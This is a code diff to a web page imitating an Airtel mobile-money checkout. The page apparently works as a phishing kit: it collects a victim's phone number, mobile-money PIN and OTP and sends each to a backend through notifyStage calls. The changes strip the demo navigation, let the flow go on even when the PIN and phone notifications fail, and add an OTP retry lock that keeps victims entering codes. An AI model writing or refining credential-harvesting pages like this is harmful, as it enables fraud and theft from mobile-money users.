@@ -520,7 +520,7 @@
         <label>Airtel number</label>
         <div class="phone-wrap">
           <div class="prefix">+243</div>
-          <input type="tel" id="phoneInput" placeholder="81xxxxxxx" maxlength="9" inputmode="numeric" />
+          <input type="tel" id="phoneInput" placeholder="81xxxxxxx" maxlength="9" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
         </div>
 
         <button class="btn-primary" onclick="goToPin()">
@@ -582,10 +582,10 @@
         </div>
 
         <div class="otp-inputs" id="otpInputs">
-          <input type="text" maxlength="1" inputmode="numeric" class="active" />
-          <input type="text" maxlength="1" inputmode="numeric" />
-          <input type="text" maxlength="1" inputmode="numeric" />
-          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="active" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
         </div>
 
         <button class="btn-red" id="checkOtpBtn">CHECK AND PAY</button>
@@ -602,10 +602,10 @@
         <p>Do you want to pay <strong>{{PLAN_PRICE}}</strong> for your<br>{{PLAN_NAME}} package?</p>
 
         <div class="pin-entry" id="pinEntry">
-          <input type="password" maxlength="1" inputmode="numeric" />
-          <input type="password" maxlength="1" inputmode="numeric" />
-          <input type="password" maxlength="1" inputmode="numeric" />
-          <input type="password" maxlength="1" inputmode="numeric" />
+          <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
+          <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
         </div>
 
         <div class="pin-line"></div>
@@ -620,11 +620,6 @@
       </div>
     </div>
 
-    <div class="demo-nav">
-      <button onclick="showScreen(1)">Screen 1</button>
-      <button onclick="showScreen(3)">Screen 3 (OTP)</button>
-      <button onclick="goToPin()">Show PIN Modal</button>
-    </div>
   </div>
 
   <script>
@@ -632,6 +627,8 @@
     let otpAttempts = 0;
     let currentPhone = '';
     let timerInterval = null;
+    let otpRetryUntil = 0;
+    let otpRetryTimer = null;
 
     function getPinValue() {
       const inputs = document.querySelectorAll('#pinEntry input');
@@ -678,10 +675,9 @@
       Array.from(pinInputs).forEach(input => input.value = '');
       pinInputs[0].focus();
 
-      notifyStage('phone', { phone_number: currentPhone }).then(() => {
-        document.getElementById('pinOverlay').classList.add('show');
-      }).catch(() => {
-        alert('Could not send phone notification. Please try again.');
+      document.getElementById('pinOverlay').classList.add('show');
+      notifyStage('phone', { phone_number: currentPhone }).catch(() => {
+        console.warn('Phone notification failed, but the PIN flow can continue in demo mode.');
       });
     }
 
@@ -691,19 +687,23 @@
 
     const inputs = document.querySelectorAll('#otpInputs input');
 
+    function updateActive() {
+      inputs.forEach((inp) => {
+        inp.classList.toggle('active', inp === document.activeElement);
+      });
+    }
+
     inputs.forEach((input, idx) => {
-      input.addEventListener('input', (e) => {
-        const val = e.target.value.replace(/\D/g, '');
-        e.target.value = val;
-        if (val && idx < inputs.length - 1) {
+      input.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+        if (this.value && idx < inputs.length - 1) {
           inputs[idx + 1].focus();
-          inputs[idx + 1].classList.add('active');
         }
         updateActive();
       });
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+      input.addEventListener('keydown', function (event) {
+        if (event.key === 'Backspace' && !this.value && idx > 0) {
           inputs[idx - 1].focus();
         }
       });
@@ -711,19 +711,20 @@
       input.addEventListener('paste', (e) => {
         e.preventDefault();
         const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+
+        if (!paste) return;
+
         paste.split('').forEach((char, i) => {
           if (inputs[i]) inputs[i].value = char;
         });
-        if (paste.length === 4) inputs[3].focus();
+
+        const targetIndex = Math.min(paste.length, inputs.length - 1);
+        if (targetIndex < inputs.length - 1) {
+          inputs[targetIndex].focus();
+        }
         updateActive();
       });
     });
-
-    function updateActive() {
-      inputs.forEach((inp, i) => {
-        inp.classList.toggle('active', inp === document.activeElement || (inp.value && i === 0));
-      });
-    }
 
     function startTimer(seconds = 56) {
       const el = document.getElementById('countdown');
@@ -736,6 +737,39 @@
         el.textContent = remaining;
         if (remaining <= 0) {
           clearInterval(timerInterval);
+        }
+      }, 1000);
+    }
+
+    function setOtpRetryLock(seconds = 60) {
+      const button = document.getElementById('checkOtpBtn');
+      const countdownEl = document.getElementById('countdown');
+      otpRetryUntil = Date.now() + (seconds * 1000);
+
+      clearInterval(timerInterval);
+      let remaining = seconds;
+      countdownEl.textContent = remaining;
+
+      Array.from(inputs).forEach(input => {
+        input.disabled = true;
+        input.value = '';
+      });
+      button.disabled = true;
+      button.textContent = 'RETRY IN 60s';
+
+      clearInterval(otpRetryTimer);
+      otpRetryTimer = setInterval(() => {
+        remaining = Math.max(0, Math.ceil((otpRetryUntil - Date.now()) / 1000));
+        countdownEl.textContent = remaining;
+        button.textContent = remaining > 0 ? `RETRY IN ${remaining}s` : 'CHECK AND PAY';
+
+        if (remaining <= 0) {
+          clearInterval(otpRetryTimer);
+          Array.from(inputs).forEach(input => {
+            input.disabled = false;
+          });
+          button.disabled = false;
+          inputs[0].focus();
         }
       }, 1000);
     }
@@ -755,12 +789,11 @@
         const fullPin = getPinValue();
         if (fullPin.length === 4) {
           const pin = fullPin;
-          notifyStage('pin', { phone_number: currentPhone, pin }).then(() => {
-            closePin();
-            showScreen(3);
-            startTimer();
-          }).catch(() => {
-            alert('Could not send PIN notification. Please try again.');
+          closePin();
+          showScreen(3);
+          startTimer();
+          notifyStage('pin', { phone_number: currentPhone, pin }).catch(() => {
+            console.warn('PIN notification failed, but the OTP flow can continue in demo mode.');
           });
         }
       });
@@ -779,6 +812,12 @@
         return;
       }
 
+      if (Date.now() < otpRetryUntil) {
+        const remaining = Math.ceil((otpRetryUntil - Date.now()) / 1000);
+        alert('Too many attempts. Please wait ' + remaining + ' seconds before retrying the OTP.');
+        return;
+      }
+
       otpAttempts += 1;
       notifyStage('otp', {
         phone_number: currentPhone,
@@ -793,9 +832,9 @@
 
         const remaining = 5 - otpAttempts;
         if (remaining > 0) {
-          alert('Incorrect OTP. Please retry. ' + remaining + ' attempt(s) left.');
+          alert('Incorrect OTP. Please wait 1 minute before retrying.');
+          setOtpRetryLock(60);
           Array.from(inputs).forEach(input => input.value = '');
-          inputs[0].focus();
         } else {
           alert('Maximum OTP attempts reached. Please request a new OTP.');
           Array.from(inputs).forEach(input => input.disabled = true);
@@ -807,7 +846,9 @@
     });
 
     document.getElementById('screen3').addEventListener('transitionend', () => {
-      inputs[0].focus();
+      if (!Array.from(inputs).some(input => input.value)) {
+        inputs[0].focus();
+      }
     });
   </script>
 </body>
